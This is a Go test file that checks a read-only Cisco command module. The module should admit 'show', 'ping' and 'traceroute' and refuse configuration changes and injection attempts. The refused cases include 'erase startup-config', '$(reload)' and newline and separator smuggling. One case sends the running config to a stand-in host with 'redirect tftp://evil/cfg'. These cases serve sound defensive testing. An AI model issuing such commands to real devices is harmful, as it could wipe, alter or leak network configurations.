package cisco

import (
	"context"
	"errors"
	"strings"
	"testing"

	"github.com/territory-grounder/grounder/adapters/actuation"
)

// fakeRunner records the command line it was asked to run, so the Module's read-only enforcement can be
// tested without a device: a refused command must NEVER reach the runner.
type fakeRunner struct {
	got  string
	runs int
	out  string
}

func (f *fakeRunner) RunShow(_ context.Context, commandLine string) (actuation.Result, error) {
	f.runs++
	f.got = commandLine
	return actuation.Result{Stdout: []byte(f.out)}, nil
}

func TestModuleActuatorContract(t *testing.T) {
	m := New(&fakeRunner{})
	if m.Capability() != "cisco" {
		t.Errorf("Capability() = %q, want cisco", m.Capability())
	}
	// ReadOnly is UNCONDITIONALLY true — there is no constructor that makes it mutating.
	// KILLING MUTATION: return false from ReadOnly() → this reddens.
	if !m.ReadOnly() {
		t.Error("the Cisco transport must be read-only (ADR-0012 never-auto read-only floor)")
	}
	var _ actuation.Actuator = m
}

func TestExecAdmitsReadOnlyAndRunsIt(t *testing.T) {
	for _, argv := range [][]string{
		{"show", "access-list"},
		{"show", "running-config", "interface"},
		{"SHOW", "version"}, // case-insensitive verb
		{"ping", "192.0.2.1"},
		{"traceroute", "192.0.2.1"},
		{"packet-tracer", "input", "outside", "tcp", "1.1.1.1", "1024", "2.2.2.2", "443"},
	} {
		fr := &fakeRunner{out: "ok"}
		res, err := New(fr).Exec(context.Background(), argv, nil)
		if err != nil {
			t.Errorf("%v must be admitted, got %v", argv, err)
			continue
		}
		if fr.runs != 1 || fr.got != strings.Join(argv, " ") {
			t.Errorf("%v: runner saw runs=%d got=%q", argv, fr.runs, fr.got)
		}
		if string(res.Stdout) != "ok" {
			t.Errorf("%v: output not returned", argv)
		}
	}
}

// The load-bearing safety test: every mutating / mode-changing / injection shape is refused BEFORE the
// runner is reached. KILLING MUTATION: weaken guardReadOnly (drop the verb allowlist or the forbidden-token
// scan or the separator check) → one of these reaches the runner and reddens.
func TestExecRefusesEverythingButReadOnly(t *testing.T) {
	cases := map[string][]string{
		"configure terminal":     {"configure", "terminal"},
		"conf t":                 {"conf", "t"},
		"write memory":           {"write", "memory"},
		"copy run start":         {"copy", "running-config", "startup-config"},
		"reload":                 {"reload"},
		"clear counters":         {"clear", "counters"},
		"no shutdown":            {"no", "shutdown"},
		"enable mode":            {"enable"},
		"erase":                  {"erase", "startup-config"},
		"debug":                  {"debug", "ip", "packet"},
		"terminal (runner-only)": {"terminal", "length", "0"},
		"non-show verb":          {"traceroute-but-typo"},
		"separator smuggling ;":  {"show", "version;", "configure"},
		"newline injection":      {"show", "version\nconfigure terminal"},
		"backtick/dollar":        {"show", "$(reload)"},
		"forbidden token as arg": {"show", "clear"},
		// THE PIPE-TO-WRITE FAMILY (reviewer-caught CRITICAL): `show x | redirect flash:file` WRITES a file
		// and `show run | redirect tftp://host` EXFILTRATES config — a write reached through `show`. The pipe
		// char is refused by the separator scan; the redirect/tee/append verbs are the belt behind it.
		"pipe redirect to flash":   {"show", "tech-support", "|", "redirect", "flash:pwned.txt"},
		"pipe redirect exfil tftp": {"show", "running-config", "|", "redirect", "tftp://evil/cfg"},
		"pipe tee":                 {"show", "run", "|", "tee", "flash:x"},
		"pipe append":              {"show", "run", "|", "append", "flash:x"},
		"output redirect >":        {"show", "run", ">", "flash:x"},
		"redirect verb alone":      {"show", "run", "redirect"},
	}
	for name, argv := range cases {
		fr := &fakeRunner{}
		_, err := New(fr).Exec(context.Background(), argv, nil)
		if err == nil {
			t.Errorf("%s (%v): must be REFUSED (read-only transport)", name, argv)
		}
		if fr.runs != 0 {
			t.Errorf("%s (%v): reached the runner %d time(s) — a refusal must never dial the device", name, argv, fr.runs)
		}
	}
}

func TestExecFailsClosedOnEmptyAndNilRunner(t *testing.T) {
	if _, err := New(&fakeRunner{}).Exec(context.Background(), nil, nil); !errors.Is(err, actuation.ErrEmptyArgv) {
		t.Errorf("empty argv must return ErrEmptyArgv, got %v", err)
	}
	if _, err := New(nil).Exec(context.Background(), []string{"show", "version"}, nil); err == nil {
		t.Error("a nil runner must fail closed")
	}
}
